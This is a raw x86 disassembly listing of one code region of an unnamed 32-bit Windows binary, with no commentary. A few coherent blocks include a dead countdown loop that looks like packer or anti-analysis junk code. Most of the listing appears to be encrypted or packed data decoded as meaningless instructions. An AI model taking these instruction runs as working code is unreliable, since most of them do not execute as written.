  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b32
  403acb:	mov    eax,0x10201f10
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403afc
  403ad7:	addr16 jnp 0x403b44
  403ada:	cs jbe 0x403aed
  403add:	fild   QWORD PTR ds:0xea26d379
  403ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae4:	mov    ch,0xef
  403ae6:	dec    edx
  403ae7:	xchg   ebp,eax
  403ae8:	sbb    BYTE PTR es:[ebp+esi*8-0x7a],bh
  403aed:	pop    ebp
  403aee:	out    dx,eax
  403aef:	popf   
  403af0:	and    eax,0x49bae7f4
  403af5:	mov    ds:0x5d2cb809,eax
  403afb:	mov    al,ds:0x6400d26f
  403b00:	mov    ecx,0x24ab98de
  403b05:	scas   eax,DWORD PTR es:[edi]
  403b06:	ss add eax,0x62116457
  403b0c:	gs mov esp,0xc2817ce6
  403b12:	dec    edx
  403b13:	cmp    edx,edi
  403b15:	jecxz  0x403b3b
  403b17:	sahf   
  403b18:	add    al,cl
  403b1a:	test   DWORD PTR [eax-0xe],ebx
  403b1d:	push   edi
  403b1e:	fsubr  QWORD PTR [ecx+0x50b7c8a2]
  403b24:	into   
  403b25:	push   edx
  403b26:	cmp    ah,ch
  403b28:	xor    esp,ebp
  403b2a:	adc    bh,BYTE PTR [ecx]
  403b2c:	cmc    
  403b2d:	mov    ebp,0x10d782be
  403b32:	scas   eax,DWORD PTR es:[edi]
  403b33:	xor    DWORD PTR [ebx+eax*1+0xe2d1e69],esp
  403b3a:	jp     0x403b90
  403b3c:	in     al,dx
  403b3d:	in     al,dx
  403b3e:	test   al,0xcc
  403b40:	loopne 0x403b16
  403b42:	fiadd  WORD PTR [eax-0x12c8e05e]
  403b48:	fmul   st(5),st
  403b4a:	icebp  
  403b4b:	fwait
  403b4c:	adc    dl,BYTE PTR [eax+eax*4]
  403b4f:	fistp  WORD PTR [ebx]
  403b51:	mov    al,ds:0x85ac0b84
  403b56:	push   0x37
  403b58:	sub    BYTE PTR [eax+0xb6fa9f2],ah
  403b5e:	ret    
  403b5f:	in     eax,dx
  403b60:	pop    edi
  403b61:	lods   eax,DWORD PTR ds:[esi]
  403b62:	add    edi,DWORD PTR [esi]
  403b64:	rcr    DWORD PTR [esi-0x80],cl
  403b67:	mov    esi,0x7d21ad35
  403b6c:	xchg   ebp,eax
  403b6d:	(bad)  
  403b6e:	mov    bh,0x7c
  403b70:	js     0x403b55
  403b72:	mov    ss,WORD PTR [edi+ebx*1+0x4c]
  403b76:	mov    bh,0x51
  403b78:	push   eax
  403b79:	jecxz  0x403b73
  403b7b:	push   cs
  403b7c:	into   
  403b7d:	(bad)  
  403b7e:	test   al,0xd5
  403b80:	jo     0x403b3d
  403b82:	test   DWORD PTR [ebp-0x539af599],esp
  403b88:	(bad)  
  403b89:	sub    ah,al
  403b8b:	test   al,ch
  403b8d:	xchg   esp,eax
  403b8e:	xchg   ebp,eax
  403b8f:	ins    BYTE PTR es:[edi],dx
  403b90:	or     al,0x8
  403b92:	cmp    eax,0x45fc23e8
  403b97:	xor    eax,0x6e6bf231
  403b9c:	mov    bh,0x15
  403b9e:	jo     0x403c01
  403ba0:	xchg   ebx,eax
  403ba1:	(bad)  
  403ba2:	cmc    
  403ba3:	imul   edx,DWORD PTR [ebx],0xf8134ed3
  403ba9:	mov    ds:0xab26f703,al
  403bae:	push   esi
  403baf:	pop    edx
  403bb0:	gs test eax,0x7214274
  403bb6:	int    0xc7
  403bb8:	or     DWORD PTR ds:0xd3735c3f,0x1bc8235b
  403bc2:	int3   
  403bc3:	mov    edi,eax
  403bc5:	pusha  
  403bc6:	add    edx,DWORD PTR [ebx]
  403bc8:	push   ebx
  403bc9:	bound  esp,QWORD PTR ds:0x724f21ae
  403bcf:	test   DWORD PTR [ecx+0x9d64da2],0x47135074
  403bd9:	hlt    
  403bda:	sub    DWORD PTR [ebx-0x13],0x50585df2
  403be1:	xor    ah,al
  403be3:	or     ah,BYTE PTR [esi+edi*2]
  403be6:	push   ecx
  403be7:	popa   
  403be8:	dec    ecx
  403be9:	cmp    BYTE PTR [ebx+0x1b05af2c],dh
  403bef:	push   esi
  403bf0:	das    
  403bf1:	inc    esi
  403bf2:	cmc    
  403bf3:	dec    esp
  403bf4:	imul   ebx,ebp,0x1b
  403bf7:	ret    
  403bf8:	lahf   
  403bf9:	mov    DWORD PTR [ebx-0x6f],esi
  403bfc:	clc    
  403bfd:	mov    bl,0xef
  403bff:	sti    
  403c00:	bound  edx,QWORD PTR [edx-0x3cd01d3a]
  403c06:	sbb    DWORD PTR [ebx+0xc788eaa],0x88567815
  403c10:	pop    ebx
  403c11:	fucomi st,st(5)
  403c13:	sub    eax,0x78bff4f2
  403c18:	add    eax,0xd66fb4ea
  403c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c1e:	cdq    
  403c1f:	pop    ds
  403c20:	adc    eax,edi
  403c22:	pop    es
  403c23:	xor    al,0x76
  403c25:	(bad)  
  403c26:	enter  0xfd2,0xb8
  403c2a:	add    edi,edi
  403c2c:	add    al,0xb0
  403c2e:	pop    esp
  403c2f:	fwait
  403c30:	xor    eax,0xc83daf15
  403c35:	daa    
  403c36:	pop    ss
  403c37:	inc    eax
  403c38:	cmovne edi,DWORD PTR es:[edx]
  403c3c:	mov    edx,0x89a452e0
  403c42:	push   ss
  403c43:	(bad)  
  403c44:	pusha  
  403c45:	out    dx,eax
  403c46:	enter  0x91d3,0x35
  403c4a:	arpl   WORD PTR [ebx-0x26],di
  403c4d:	sub    eax,0xbf61b2d5
  403c52:	adc    ah,BYTE PTR [ebx]
  403c54:	retf   0xed03
  403c57:	ret    0xc218
  403c5a:	je     0x403c7d
  403c5c:	data16 and BYTE PTR [ebp-0x1c126c87],ch
  403c63:	shl    BYTE PTR [edi-0xc],cl
  403c66:	mov    esi,0x19d04cfa
  403c6b:	dec    ecx
  403c6c:	sahf   
  403c6d:	pop    eax
  403c6e:	jp     0x403c45
  403c70:	repnz push ss
  403c72:	out    dx,eax
  403c73:	cli    
  403c74:	sbb    bl,ch
  403c76:	inc    esp
  403c77:	aaa    
  403c78:	in     eax,0x8c
  403c7a:	add    eax,0x3d929e41
  403c7f:	push   ebx
  403c80:	ins    BYTE PTR es:[edi],dx
  403c81:	das    
  403c82:	cmp    BYTE PTR [ecx-0x61],ch
  403c85:	inc    ebx
  403c86:	call   FWORD PTR [edi+edi*4]
  403c89:	int    0xa0
  403c8b:	cmp    BYTE PTR [esi+0x5694e4d3],bl
  403c91:	stos   DWORD PTR es:[edi],eax
  403c92:	sbb    BYTE PTR [ecx+0x67b0fba2],0xcb
  403c99:	mov    eax,0x6cdeb3d9
  403c9e:	xor    eax,0x9d5ddf42
  403ca3:	sub    eax,0x5f56923d
  403ca8:	push   cs
  403ca9:	arpl   WORD PTR [edi],ax
  403cab:	fbld   TBYTE PTR [ecx]
  403cad:	sahf   
  403cae:	cwde   
  403caf:	inc    ecx
  403cb0:	xor    eax,0xcb6b95af
  403cb5:	rdmsr  
  403cb7:	stos   DWORD PTR es:[edi],eax
  403cb8:	sub    DWORD PTR [eax],esp
  403cba:	xchg   esi,eax
  403cbb:	shl    DWORD PTR [esi],0x1f
  403cbe:	cmp    BYTE PTR [ecx-0x40],0xea
  403cc2:	arpl   WORD PTR ds:[ecx-0x353a77dd],ax
  403cc9:	je     0x403cd0
  403ccb:	fmul   QWORD PTR [ebp+0x13]
  403cce:	mov    dh,0x58
  403cd0:	and    dh,0xd8
  403cd3:	pop    ss
  403cd4:	clc    
  403cd5:	ds mov dl,0x59
  403cd8:	push   0xf9b4a05
  403cdd:	ds jmp 0x1f911be5
  403ce3:	and    eax,0x9dc6305
  403ce8:	xchg   esp,eax
  403ce9:	cwde   
  403cea:	adc    ebx,DWORD PTR [esi+0x1e449c22]
  403cf0:	ret    
  403cf1:	mov    ?,WORD PTR [ebp-0x79]
  403cf4:	arpl   WORD PTR [edx+0x67],bp
  403cf7:	test   ebx,eax
  403cf9:	rcr    bl,0x60
  403cfc:	pop    ebp
  403cfd:	push   ss
  403cfe:	out    0x38,al
  403d00:	rcl    dl,0xc4
  403d03:	(bad)  
  403d04:	or     al,0x15
  403d06:	(bad)  
  403d07:	(bad)  
  403d08:	ins    DWORD PTR es:[edi],dx
  403d09:	xchg   edi,eax
  403d0a:	adc    eax,0xc1d4e671
  403d0f:	mov    BYTE PTR [esi],dh
  403d11:	push   ebp
  403d12:	out    dx,eax
  403d13:	loope  0x403cf9
  403d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d16:	pop    esp
  403d17:	mov    al,ds:0xacf5a4f2
  403d1c:	ds sbb al,0x78
  403d1f:	push   es
  403d20:	fs iret 
  403d22:	jb     0x403d0d
  403d24:	xchg   BYTE PTR [esi+0x1d4ffa18],al
  403d2a:	cdq    
  403d2b:	xor    al,0xf3
  403d2d:	lahf   
  403d2e:	icebp  
  403d2f:	jne    0x403d85
  403d31:	xor    DWORD PTR [edx],edx
  403d33:	mov    WORD PTR [ebp-0x5d1bec0e],?
  403d39:	adc    al,0x30
  403d3b:	test   al,0xd8
  403d3d:	cs jne 0x403cd5
  403d40:	lods   al,BYTE PTR ds:[esi]
  403d41:	add    ah,0x21
  403d44:	adc    al,0xd2
  403d46:	aam    0x58
  403d48:	xchg   ecx,eax
  403d49:	aas    
  403d4a:	mov    dl,0x86
  403d4c:	jg     0x403dc1
  403d4e:	mov    DWORD PTR [ecx+esi*1],esi
  403d51:	lock mov ds:0xebbedb,al
  403d57:	mov    esi,0xe70c639c
  403d5c:	frstor [edx]
  403d5e:	jmp    0x403dca
  403d60:	pop    ds
  403d61:	(bad)  
  403d62:	addr16 in al,0x12
  403d65:	jnp    0x403d37
  403d67:	jns    0x403d16
  403d69:	xchg   ecx,eax
  403d6a:	cmp    ch,bl
  403d6c:	ins    DWORD PTR es:[di],dx
  403d6e:	mov    edx,0x8eca0be3
  403d73:	lea    edx,[edi-0xe]
  403d76:	and    BYTE PTR [ecx+0x4f4fe163],ch
  403d7c:	fstp   TBYTE PTR [edx]
  403d7e:	jge    0x403d78
  403d80:	jae    0x403dd7
  403d82:	int3   
  403d83:	(bad)  
  403d84:	sbb    al,0xca
  403d86:	mov    ebx,DWORD PTR [ecx+edi*8-0x46]
  403d8a:	sub    ebx,DWORD PTR [edx]
  403d8c:	cld    
  403d8d:	jmp    0x403d8f
  403d8f:	es jmp 0x403da0
  403d92:	mov    bh,0x7f
  403d94:	cmc    
  403d95:	rcr    BYTE PTR [ebp+0xf],1
  403d98:	ret    0xf20a
  403d9b:	mov    cs,WORD PTR [eax+edi*4+0xb]
  403d9f:	jae    0x403dc6
  403da1:	sub    al,0x19
  403da3:	shr    BYTE PTR [edi+eax*1+0x1e186497],cl
  403daa:	mov    al,0xaa
  403dac:	fild   QWORD PTR [esi+0x7d]
  403daf:	cli    
  403db0:	jle    0x403dc7
  403db2:	push   ebx
  403db3:	mov    ?,WORD PTR [eax]
  403db5:	add    edi,DWORD PTR [ebx-0x3b]
  403db8:	in     eax,dx
  403db9:	push   ds
  403dba:	dec    edx
  403dbb:	scas   al,BYTE PTR es:[edi]
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffff9c
  403e75:	push   eax
  403e76:	push   esp
  403e77:	sbb    cl,BYTE PTR [edx]
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e06
  403e81:	leave  
  403e82:	inc    edi
  403e83:	out    dx,eax
  403e84:	mov    ecx,0xa4e38e72
  403e89:	rol    DWORD PTR [ebp-0x20e54a4d],1
  403e8f:	push   esp
  403e90:	or     DWORD PTR [ecx+0x80e1b0f],esi
  403e96:	int3   
  403e97:	cs rol ecx,cl
  403e9a:	add    BYTE PTR ds:0xe8278de5,dl
  403ea0:	or     BYTE PTR [eax+0x23],ah
  403ea3:	jmp    0x6cc0:0x5e0c8110
  403eaa:	pusha  
  403eab:	nop
  403eac:	shl    DWORD PTR [esi+0x350cc471],1
  403eb2:	jmp    DWORD PTR [ecx+esi*2+0x2e]
  403eb6:	std    
  403eb7:	popf   
  403eb8:	sahf   
  403eb9:	add    dl,bl
  403ebb:	mov    edi,eax
  403ebd:	repz out 0xd0,eax
  403ec0:	mov    WORD PTR [esi+0xbc71e45],cs
  403ec6:	lock mov esp,0xbf20b691
  403ecc:	aam    0xf4
  403ece:	cdq    
  403ecf:	js     0x403eb8
  403ed1:	fsubr  st,st(7)
  403ed3:	add    eax,0x9c2685d0
  403ed8:	adc    edi,ecx
  403eda:	mov    ds:0x580f8b2,eax
  403edf:	pop    esi
  403ee0:	inc    ecx
  403ee1:	mov    ecx,DWORD PTR [edx-0x60918336]
  403ee7:	mov    edx,0x6cf24d70
  403eec:	jmp    FWORD PTR [ebx+0x1474c8cf]
  403ef2:	int    0xa2
  403ef4:	sub    DWORD PTR [ebp+0x53735188],edx
  403efa:	ds mov al,bl
  403efd:	jmp    0x403f2d
  403eff:	mov    eax,0xbbebf45b
  403f04:	fadd   QWORD PTR [ebx-0x50]
  403f07:	sub    ch,BYTE PTR [edx]
  403f09:	data16 aad 0xce
  403f0c:	inc    ebx
  403f0d:	hlt    
  403f0e:	mov    al,0x2c
  403f10:	sub    esp,DWORD PTR [ebx-0x4384cefa]
  403f16:	xor    esi,DWORD PTR [ebp+eax*2+0x2e]
  403f1a:	jge    0x403f70
  403f1c:	jb     0x403f20
  403f1e:	cld    
  403f1f:	and    BYTE PTR [edx+0x1c49bd],bl
  403f25:	pop    ds
  403f26:	ds push ecx
  403f28:	pop    edi
  403f29:	sahf   
  403f2a:	div    DWORD PTR [ebp-0x70541cf5]
  403f30:	pop    esi
  403f31:	shl    DWORD PTR [ecx],0xea
  403f34:	fwait
  403f35:	aaa    
  403f36:	in     al,dx
  403f37:	push   0x74bad97c
  403f3c:	dec    edi
  403f3d:	(bad)
  403f41:	loopne 0x403f57
  403f43:	adc    eax,0xad043414
  403f48:	add    DWORD PTR [ebp+eiz*1-0x69],esi
  403f4c:	cli    
  403f4d:	inc    esp
  403f4e:	mov    ds:0xefa1d307,al
  403f53:	aaa    
  403f54:	arpl   bp,bp
  403f56:	adc    eax,0x19006656
  403f5b:	adc    edx,edi
  403f5d:	xor    ebx,edi
  403f5f:	call   DWORD PTR ds:0xf2cc46ad
  403f65:	push   0x26
  403f67:	xor    eax,0x934a9da5
  403f6c:	lds    esi,FWORD PTR [edx]
  403f6e:	je     0x403f70
  403f70:	aad    0xbb
  403f72:	sbb    al,0x44
  403f74:	mov    WORD PTR [ebp+0x6e14477a],cs
  403f7a:	cdq    
  403f7b:	fwait
  403f7c:	dec    ebx
  403f7d:	sbb    bl,BYTE PTR [ebx]
  403f7f:	mov    esi,0xcf48b50d
  403f84:	ja     0x403f97
  403f86:	mov    ecx,0xa0b1d862
  403f8b:	repnz out dx,eax
  403f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8e:	add    BYTE PTR ds:0xb9645ac4,dh
  403f94:	ins    BYTE PTR es:[edi],dx
  403f95:	jne    0x403fc3
  403f97:	es pop edi
  403f99:	pop    eax
  403f9a:	or     dh,BYTE PTR [edx-0x7a8d0544]
  403fa0:	ja     0x403f9a
  403fa2:	mov    eax,0xbfa9bfde
  403fa7:	pop    ecx
  403fa8:	mov    ds:0x8941a252,eax
  403fad:	in     al,0xb
  403faf:	in     eax,0x5a
  403fb1:	test   DWORD PTR [ebx],0x566a9092
  403fb7:	ror    BYTE PTR [ebp-0x64],cl
  403fba:	js     0x403fbc
  403fbc:	inc    edx
  403fbd:	mov    ebx,0x3543b180
  403fc2:	mov    ebx,0x64c5ef71
  403fc7:	int3   
  403fc8:	test   ecx,0xd6704486
  403fce:	call   0x2878:0xb6ea1295
  403fd5:	mov    ecx,DWORD PTR [ecx+0x4c078ff6]
  403fdb:	clc    
  403fdc:	xchg   esp,eax
  403fdd:	int3   
  403fde:	mov    ch,0x5f
  403fe0:	test   al,0x2
  403fe2:	push   esi
  403fe3:	cld    
  403fe4:	popa   
  403fe5:	pop    ebx
  403fe6:	lea    eax,[ebp+ebx*1-0x1d4b082c]
  403fed:	mov    esp,0x8393854a
  403ff2:	inc    eax
  403ff3:	push   esi
  403ff4:	shr    edx,cl
  403ff6:	out    0x32,al
  403ff8:	cmc    
  403ff9:	mov    ah,0xbe
  403ffb:	pop    edi
  403ffc:	jns    0x40401b
  403ffe:	and    dh,BYTE PTR ds:0xfcb5515f
  404004:	stos   DWORD PTR es:[edi],eax
  404005:	out    0x68,eax
  404007:	enter  0x4508,0xcc
  40400b:	lds    ecx,FWORD PTR [edx+ebp*1-0x1195e317]
  404012:	sub    BYTE PTR [ecx+0x46408431],cl
  404018:	cmp    DWORD PTR [ebx+esi*4-0x7e],0x6e
  40401d:	jb     0x404061
  40401f:	repz fcom QWORD PTR [ecx+0x3d1370be]
  404026:	push   ebp
  404027:	aam    0x8a
  404029:	sahf   
  40402a:	fwait
  40402b:	mov    ah,0xe1
  40402d:	xlat   BYTE PTR ds:[ebx]
  40402e:	sub    al,0xdc
  404030:	fbstp  TBYTE PTR [eax-0x3e]
  404033:	fwait
  404034:	push   edx
  404035:	rcr    BYTE PTR [eax],1
  404037:	push   es
  404038:	jmp    0xdcf5:0x2e09015b
  40403f:	shr    DWORD PTR [edx+esi*8+0x63761f1e],1
  404046:	neg    DWORD PTR [ebp+0x1c8e9c43]
  40404c:	(bad)  [ebx+0x3b]
  40404f:	ror    DWORD PTR [edi],0xd4
  404052:	stos   BYTE PTR es:[edi],al
  404053:	shl    DWORD PTR [eax],1
  404055:	ja     0x4040c3
  404057:	jb     0x403ff7
  404059:	mov    edi,0x198cf250
  40405e:	inc    ebx
  40405f:	outs   dx,DWORD PTR ds:[esi]
  404060:	les    edx,FWORD PTR [esi+ecx*1+0x903702d]
  404067:	and    eax,0x168f5780
  40406c:	test   DWORD PTR [edi+ecx*8-0x4c],0x846da472
  404074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404075:	jmp    0xba0d:0xae4fbb65
  40407c:	test   DWORD PTR [ebx-0x46703123],esp
  404082:	push   edx
  404083:	mov    esi,0xe5ed3e29
  404088:	popa   
  404089:	jle    0x404027
  40408b:	es add dl,bl
  40408e:	cmp    ch,BYTE PTR [edi]
  404090:	and    eax,ebp
  404092:	pop    esp
  404093:	mov    ch,0xea
  404095:	in     al,dx
  404096:	inc    edi
  404097:	sahf   
  404098:	not    BYTE PTR [ecx]
  40409a:	adc    DWORD PTR [ecx-0x68],ecx
  40409d:	outs   dx,BYTE PTR ds:[esi]
  40409e:	fwait
  40409f:	sub    ebp,0xf8eea7fb
  4040a5:	mov    BYTE PTR [ebp*8+0x71b5d03],ch
  4040ac:	cli    
  4040ad:	mov    ebx,fs
  4040af:	test   al,0xe2
  4040b1:	icebp  
  4040b2:	sbb    edx,DWORD PTR [edx]
  4040b4:	push   eax
  4040b5:	sub    al,BYTE PTR [edx-0xfd41d9c]
  4040bb:	inc    ecx
  4040bc:	cmp    edx,DWORD PTR [eax]
  4040be:	sbb    bh,dl
  4040c0:	ror    ebx,cl
  4040c2:	call   0xffd0:0xae9ad66d
  4040c9:	ins    DWORD PTR es:[edi],dx
  4040ca:	cmp    al,0x83
  4040cc:	sbb    BYTE PTR [ebx+ecx*1-0x65aee31a],0x1a
  4040d4:	jb     0x4040e0
  4040d6:	das    
  4040d7:	jne    0x404074
  4040d9:	out    dx,al
  4040da:	(bad)  
  4040db:	loope  0x4040c4
  4040dd:	pop    ss
  4040de:	jb     0x404070
  4040e0:	shl    DWORD PTR [eax],0xe0
  4040e3:	mov    al,0xc5
  4040e5:	mov    ch,0x1b
  4040e7:	gs jg  0x4040d6
  4040ea:	sub    DWORD PTR ds:0x445ab29e,ecx
  4040f0:	push   ebx
  4040f1:	xchg   esi,eax
  4040f2:	aas    
  4040f3:	rcl    DWORD PTR [ebp+0x5f],1
  4040f6:	prefetch BYTE PTR [ecx-0x68]
  4040fa:	mov    ebx,0x40d02c64
  4040ff:	xor    eax,0xbf8435c0
  404104:	aad    0xd0
  404106:	shl    BYTE PTR [edi],1
  404108:	adc    esp,edx
  40410a:	outs   dx,DWORD PTR ds:[esi]
  40410b:	adc    DWORD PTR [ecx-0x6a2773ea],ecx
  404111:	mov    WORD PTR [ecx],fs
  404113:	int3   
  404114:	xor    al,0xc2
  404116:	cli    
  404117:	jl     0x40413d
  404119:	int3   
  40411a:	rcr    edx,cl
  40411c:	inc    ecx
  40411d:	mov    ds:0x2aa8590,al
  404122:	xlat   BYTE PTR ds:[ebx]
  404123:	sub    bl,bh
  404125:	fwait
  404126:	cmp    al,0x36
  404128:	pop    esp
  404129:	or     ch,BYTE PTR [ebp-0x58b33d67]
  40412f:	or     dl,BYTE PTR [edx]
  404131:	cmp    esp,edx
  404133:	cdq    
  404134:	(bad)
  404137:	jge    0x404130
  404139:	cwde   
  40413a:	pop    esi
  40413b:	mov    al,ds:0x31dbd8b4
  404140:	add    bl,bl
  404142:	jg     0x404182
  404144:	and    ah,BYTE PTR [eax+0x24]
  404147:	in     al,dx
  404148:	push   ss
  404149:	idiv   cl
  40414b:	leave  
  40414c:	(bad)  
  40414d:	jae    0x404123
  40414f:	jmp    0x83657670
  404154:	jmp    0x40415e
  404156:	nop
  404157:	outs   dx,DWORD PTR ds:[esi]
  404158:	add    esi,DWORD PTR [esi+ebx*4+0x11]
  40415c:	inc    ebx
  40415d:	or     dl,BYTE PTR [edx]
  40415f:	mov    ah,0x56
  404161:	shr    DWORD PTR [edx+0x2b1cd79b],1
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ecx],cl
  40418b:	je     0x4041ea
  40418d:	and    eax,0x7e7e1d74
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x404155
  404197:	adc    eax,0xa2fe1327
  40419c:	dec    ecx
  40419d:	xchg   ebx,eax
  40419e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419f:	mov    dl,0xe4
  4041a1:	mov    cl,0x25
  4041a3:	dec    ebp
  4041a4:	xor    esi,0xfffffff1
  4041a7:	ret    0xd911
  4041aa:	repz adc DWORD PTR ds:[edx],edi
  4041ae:	js     0x404196
  4041b0:	imul   esi,ebx,0x285ac0b6
  4041b6:	sbb    DWORD PTR [edi+0x55],0x91195c1b
  4041bd:	xchg   ebx,eax
  4041be:	js     0x40419d
  4041c0:	or     eax,0x69a36d1e
  4041c5:	or     BYTE PTR [ebp+0x7202d55f],ch
  4041cb:	mov    ds:0x8553206b,al
  4041d0:	rol    BYTE PTR [esi-0x27af876b],1
  4041d6:	jl     0x4041a7
  4041d8:	and    DWORD PTR [esi+0xd],ebp
  4041db:	pop    ebp
  4041dc:	mov    ebp,0x307e1687
  4041e1:	ficom  DWORD PTR [di-0x6e]
  4041e5:	mov    cl,0x11
  4041e7:	retf   0x9f57
  4041ea:	mov    dh,0xce
  4041ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ed:	ja     0x4041d5
  4041ef:	in     eax,0xe
  4041f1:	in     al,0x2d
  4041f3:	add    ecx,DWORD PTR [edx-0x73d66712]
  4041f9:	aam    0x6a
  4041fb:	aas    
  4041fc:	pop    esp
  4041fd:	cwde   
  4041fe:	xchg   esp,eax
  4041ff:	mov    WORD PTR [esi],ds
  404201:	mov    dl,0xbb
  404203:	shl    BYTE PTR [ebp-0x41559c2d],cl
  404209:	mov    eax,0xe66a3cbb
  40420e:	jle    0x404245
  404210:	push   cs
  404211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404212:	jmp    0xce19473b
  404217:	lahf   
  404218:	jl     0x4041b0
  40421a:	repnz push ebp
  40421c:	shl    cl,1
  40421e:	call   DWORD PTR [ecx]
  404220:	scas   eax,DWORD PTR es:[edi]
  404221:	add    ah,dh
  404223:	jl     0x40424c
  404225:	out    0x2b,al
  404227:	jp     0x40421e
  404229:	dec    ecx
  40422a:	push   ds
  40422b:	jmp    0xe96ab934
  404230:	xor    DWORD PTR [ebp+eiz*2+0x3e52b8f1],ebx
  404237:	cmp    DWORD PTR [ecx-0x2b],0xffffff92
  40423b:	and    eax,0x27b354f2
  404240:	cdq    
  404241:	aad    0x9b
  404243:	adc    edi,DWORD PTR [edi]
  404245:	jmp    0xd63c0e24
  40424a:	xor    eax,0xa3aa9f90
  40424f:	cmp    BYTE PTR [si-0x3f35],ah
  404254:	adc    DWORD PTR [ecx-0x1bfc52db],ecx
  40425a:	and    esp,DWORD PTR [eax-0x22]
  40425d:	xchg   esi,eax
  40425e:	jno    0x404264
  404260:	test   DWORD PTR [ebx-0x1d],0xde8592b4
  404267:	jno    0x4042a7
  404269:	cdq    
  40426a:	test   eax,0x50fc0c62
  40426f:	jecxz  0x404273
  404271:	stos   BYTE PTR es:[edi],al
  404272:	pusha  
  404273:	and    esp,DWORD PTR es:[edi+0x3c]
  404277:	adc    ecx,edi
